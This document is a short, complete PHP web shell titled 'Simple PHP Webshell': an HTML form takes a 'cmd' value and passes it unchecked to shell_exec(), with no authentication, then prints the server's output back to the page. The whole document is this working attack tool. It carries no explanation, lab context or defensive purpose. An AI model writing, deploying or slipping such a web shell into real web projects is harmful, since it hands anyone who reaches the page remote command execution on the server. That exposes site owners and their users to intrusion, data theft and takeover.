<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PHP Webshell</title>
</head>
<body>
    <h2>Simple PHP Webshell</h2>
    <form method="post">
        <label for="cmd">Command:</label>
        <input type="text" id="cmd" name="cmd" required>
        <input type="submit" value="Execute">
    </form>

    <?php
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        if (isset($_POST['cmd'])) {
            $cmd = $_POST['cmd'];
            echo "<pre>";
            $output = shell_exec($cmd);
            echo htmlspecialchars($output);
            echo "</pre>";
        }
    }
    ?>
</body>
</html>
